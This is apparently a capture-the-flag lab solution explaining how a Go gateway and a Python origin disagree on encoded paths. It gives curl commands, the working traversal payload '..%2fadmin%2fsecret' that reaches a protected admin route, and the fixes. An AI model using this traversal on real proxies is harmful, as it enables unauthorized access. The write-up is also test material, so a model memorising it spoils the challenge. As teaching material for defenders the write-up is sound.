# w11 Edge Shift :: solution

## Root cause

The bug is a **disagreement between two hops about what the URL means**. The
gateway authorizes on the raw, still-encoded form; the origin dispatches on the
decoded, dot-normalized form. Neither is wrong on its own. Running them in
sequence is.

`proxy/main.go`, `handle()`:

```go
// The published surface is flat: /api/v1/<resource>. A resource with a
// nested path is not part of the public API, so it is refused.
//
// ponytail: the check counts LITERAL slashes in the still-encoded
// remainder. An encoded slash is not a slash to this test - which is the
// whole gap the traversal below walks through.
rawRemainder := strings.TrimPrefix(u.EscapedPath(), prefix)
if strings.Count(rawRemainder, "/") > 1 {
    writeJSON(w, http.StatusNotFound, map[string]string{
        "error":     "not found",
        "reason":    "the public API is flat: one resource segment per path",
        "requested": u.Path,
    })
    return
}
```

and then the forward:

```go
remainder := strings.TrimPrefix(u.EscapedPath(), prefix)
...
target := originBase() + remainder
```

`internal/server.py`, `do_GET()`:

```python
# The origin works on the RAW path it was handed. It unquotes, THEN
# resolves dot-segments, THEN routes.
decoded = unquote(raw_path)
route = normalize(decoded)

if route == "/admin/secret":
    ...
```

Three properties combined:

1. **The gateway's decision uses `EscapedPath()`.** It counts literal `/`
   characters *before* decoding, so `%2f` is invisible to the flat-resource
   rule.
2. **The gateway forwards the escaped remainder unchanged.** It does not
   normalize (`path.Clean`) and does not re-encode — it hands the raw bytes to
   the origin.
3. **The origin decodes and then normalizes before routing.** `%2f` becomes `/`,
   and `..` then walks up a segment.

The gateway's two other guards — the `..` segment check and the `%2e` check —
were both written against the raw target as well, and both correctly fire on the
spellings they were written for. They simply do not describe the third spelling.

## Recon

The landing page publishes the rule table. The ops endpoint names the origin and
the public prefix:

```bash
curl -s http://localhost:30011/api/health
# {"service":"edge-shift","lab":"w11","version":"2.11.0",
#  "origin":"http://w0b-w11-internal:9000","published":"/api/v1",...}
```

Confirm the legitimate path works, so you know the proxy is forwarding and you
are not looking at a broken service:

```bash
curl -s http://localhost:30011/api/v1/status
# {"service":"origin-9","lab":"w11","version":"9.4.0","status":"nominal",
#  "routes":["/status","/echo","/admin/secret"]}
```

The origin helpfully enumerates its own routes, including the one you want.

Confirm the origin is not directly reachable — the gateway is the only way in:

```bash
curl -s -m 3 http://localhost:9000/status
# connection refused (no host port is published)
```

## The dead ends

Walk them first; each teaches you something about where the boundary is.

**Literal dot-dot** — refused by the segment rule:

```bash
curl -s --path-as-is 'http://localhost:30011/api/v1/../admin/secret'
# {"error":"request rejected by gateway","reason":"raw request target contains a .. path segment"}
```

**Encoded dot-dot** (`%2e`) — refused by the encoded-dot rule:

```bash
curl -s --path-as-is 'http://localhost:30011/api/v1/%2e%2e%2fadmin%2fsecret'
# {"error":"request rejected by gateway","reason":"raw request target contains %2e"}
```

**The plain nested path** — refused by the flat-resource rule, and this is the
important one, because it proves the admin route is not simply sitting there:

```bash
curl -s --path-as-is 'http://localhost:30011/api/v1/admin/secret'
# {"error":"not found","reason":"the public API is flat: one resource segment per path"}
```

**Double-encoded** (`%252f`) — passes the gateway (no `..` segment, one literal
slash) but the origin unquotes it only once, arriving at the literal path
`/..%2fadmin/secret`, which matches no route:

```bash
curl -s --path-as-is 'http://localhost:30011/api/v1/..%252fadmin%252fsecret'
# {"error":"no such route","received_raw":"/..%252fadmin%252fsecret",
#  "resolved":"/..%2fadmin%2fsecret"}
```

That error is worth reading: it tells you the origin unquoted exactly once and
then normalized, which is precisely the behaviour to aim at.

## Exploit

Bind the dot-dot to an **encoded** slash:

```bash
curl -s --path-as-is 'http://localhost:30011/api/v1/..%2fadmin%2fsecret'
```

```json
{
  "service": "origin-9",
  "route": "admin/secret",
  "via_edge": true,
  "flag": "hex4b0t{...}"
}
```

Trace it through both hops:

| hop | view of the path | decision |
|---|---|---|
| gateway, raw | `/api/v1/..%2fadmin%2fsecret` | one literal slash after the prefix → flat rule satisfied |
| gateway, forwards | `/..%2fadmin%2fsecret` | unchanged |
| origin, decodes | `/../admin/secret` | — |
| origin, normalizes | `/admin/secret` | matches the admin route |

The `via_edge: true` field is the origin confirming the request arrived through
the gateway, not by some other route.

`solution/exploit.sh` runs it and greps the flag.

## The fix, and the shape of the real mistake

The tempting fix is a better regex in `edgeReject`. That is treating the
symptom, and it is exactly how this class of bug survives patch after patch —
each new spelling gets its own rule, and the set of rules never converges because
**the gateway is deciding based on a string it is not going to send**.

Two fixes that actually hold:

1. **Decide on what you forward, and forward what you decided on.** Normalize
   once, at the edge, and forward the normalized result:

   ```go
   // One canonical form. Everything downstream sees only this.
   clean := path.Clean(u.Path)            // decoded, dot-resolved
   if !strings.HasPrefix(clean, prefix+"/") && clean != prefix {
       // not public
   }
   remainder := strings.TrimPrefix(clean, prefix)
   target := originBase() + remainder     // send the CLEAN path, not the raw one
   ```

   With `clean` sent as the path, `..` and encoded slashes are already resolved
   before the origin ever sees them.

2. **Do not let routing decisions be reconstruction games at all.** If the
   public surface is a fixed, flat set of resources, dispatch on an allowlist of
   *resource names* rather than on a trimmed path:

   ```go
   switch resource {
   case "status", "echo":
       forward(resource)
   default:
       http.NotFound(w, r)
   }
   ```

   The `/admin/secret` route then is not reachable by any spelling, because no
   spelling maps to a name in the allowlist.

The deeper lesson is the one the origin also violates: **`normalize()` on a
path you did not canonicalize upstream is a security control sitting in the
wrong place.** The origin trusts that the edge already validated the path shape;
the edge trusts that the origin will treat the path it forwards as opaque. Both
trust assumptions are false, and a single traversal step in the gap between them
is enough.

## Flag

Injected at runtime into the internal origin only (`W0B_FLAG`). The gateway
itself never reads it — it only needs to be able to reach the origin.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
